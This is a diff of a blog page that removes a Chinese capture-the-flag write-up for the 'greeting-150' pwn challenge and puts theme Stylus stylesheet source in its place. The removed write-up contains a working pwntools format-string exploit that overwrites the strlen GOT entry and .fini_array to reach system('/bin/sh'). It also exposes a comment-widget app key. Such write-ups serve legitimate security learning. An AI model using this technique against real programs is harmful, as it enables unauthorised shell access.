@@ -145,268 +145,198 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">greeting-150</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ai.jpg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2021-10-21 15:07:40
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>759 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>3 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20211021150915647.png"
-                      alt="image-20211021150915647"
-                ></p>
-<p>三十二位，开启了Canary</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20211021151034031.png"
-                      alt="image-20211021151034031"
-                ></p>
-<p>执行结果是这样，猜测可能有格式化字符串</p>
-<h2 id="执行流程分析"><a href="#执行流程分析" class="headerlink" title="执行流程分析"></a>执行流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [esp+5Ch] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !getnline(v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个getnline是真的长得像libc自带的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>整体流程就是输入一段字符，然后把字符复制给s然后打印出s，s那里存在明显的格式化字符串漏洞，输入<code>aaaaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20211021152526603.png"
-                      alt="image-20211021152526603"
-                ></p>
-<p>上面是栈内的情况    </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20211021152633176.png"
-                      alt="image-20211021152633176"
-                ></p>
-<p>打印的结果，可以看到偏移量是12。而且在getnline函数里面的strlen的调用方式和system一模一样，所以篡改strlen的got表地址到system就可以直接执行了。但是目前还有一个问题就是程序是只存在一处漏洞，并且执行完了就没了，然后思路就断了，看了wp知道：</p>
-<p><strong>main在执行之前会调用.init段的代码和.init_array段的函数数组的每一个指针，在main执行结束后会调用，.fini段代码和.fini_array段的函数数组的每一个指针</strong></p>
-<h3 id="函数利用过程"><a href="#函数利用过程" class="headerlink" title="函数利用过程"></a>函数利用过程</h3><p>首先修改strlen的got表为system的plt表，那么调用strlen的时候就是就调用了system，然后修改.fini_array的段指针到main函数，然后就等main执行完之后就会重新进入main在调用getnline的时候输入/bin/sh就可以调用到system(‘/bin/sh’)了，就getshell了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:08049934 ; ELF Termination Function Table</span><br><span class="line">.fini_array:08049934 ; ===========================================================================</span><br><span class="line">.fini_array:08049934</span><br><span class="line">.fini_array:08049934 ; Segment type: Pure data</span><br><span class="line">.fini_array:08049934 ; Segment permissions: Read/Write</span><br><span class="line">.fini_array:08049934 _fini_array     segment dword public &#x27;DATA&#x27; use32</span><br><span class="line">.fini_array:08049934                 assume cs:_fini_array</span><br><span class="line">.fini_array:08049934                 ;org 8049934h</span><br><span class="line">.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux</span><br><span class="line">.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o</span><br><span class="line">.fini_array:08049934 _fini_array     ends                    ; Alternative name is &#x27;__init_array_end&#x27;</span><br><span class="line">.fini_array:08049934</span><br></pre></td></tr></table></figure>
-
-<p>上面调用的是 __do_global_dtors_aux函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:080485A0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o</span><br><span class="line">.text:080485A0                 cmp     ds:completed_6591, 0</span><br><span class="line">.text:080485A7                 jnz     short locret_80485BC</span><br><span class="line">.text:080485A9                 push    ebp</span><br><span class="line">.text:080485AA                 mov     ebp, esp</span><br><span class="line">.text:080485AC                 sub     esp, 8</span><br><span class="line">.text:080485AF                 call    deregister_tm_clones</span><br><span class="line">.text:080485B4                 mov     ds:completed_6591, 1</span><br><span class="line">.text:080485BB                 leave</span><br><span class="line">.text:080485BC</span><br><span class="line">.text:080485BC locret_80485BC:                         ; CODE XREF: __do_global_dtors_aux+7↑j</span><br><span class="line">.text:080485BC                 rep retn</span><br></pre></td></tr></table></figure>
-
-<p>函数的地址是0x080485A0，main函数的地址是0x080485ED发现只有后面四个字节不一样，所以修改后面四个字节就可了。</p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>exp:</p>
-<pre><code class="python">from pwn import *
-
-elf = ELF(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)
-# r = remote(&#39;111.200.241.244&#39;, 55046)
-r = process(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)
-
-_fini_array = 0x8049934
-main_addr = 0x85ED
-strlen_got_addr = elf.got[&#39;strlen&#39;]
-system_plt_addr = 0x8048490
-
-payload = b&#39;aa&#39;+p32(strlen_got_addr)+p32(strlen_got_addr+2)+p32(_fini_array) + \
-    b&#39;%&#39;+bytes(str(0x804-0x20), encoding=&#39;utf8&#39;)+b&#39;c%13$hn&#39;+b&#39;%&#39;+bytes(str(0x8490-0x804), encoding=&#39;utf8&#39;) + \
-    b&#39;c%12$hn&#39;+b&#39;%&#39;+bytes(str(0x85ed-0x8490), encoding=&#39;utf8&#39;)+b&#39;c%14$hn&#39;
-r.recvuntil(b&#39;Please tell me your name... &#39;)
-r.sendline(payload)
-
-r.recvuntil(b&#39;Please tell me your name... &#39;)
-r.sendline(&#39;/bin/sh&#39;)
-
-r.interactive()
-</code></pre>
-
-        </div>
-
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2021/10/25/time-formatter/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">time_formatter</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2021/10/19/Recho/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">Recho</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
-    </div>
-    
-
-        
-            
-    <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
-        <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
-        </script>
-    </div>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
 
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
-    
-</div>
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-            </div>
-        
-    </div>
-</div>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
+
+    }
+
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+  }
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
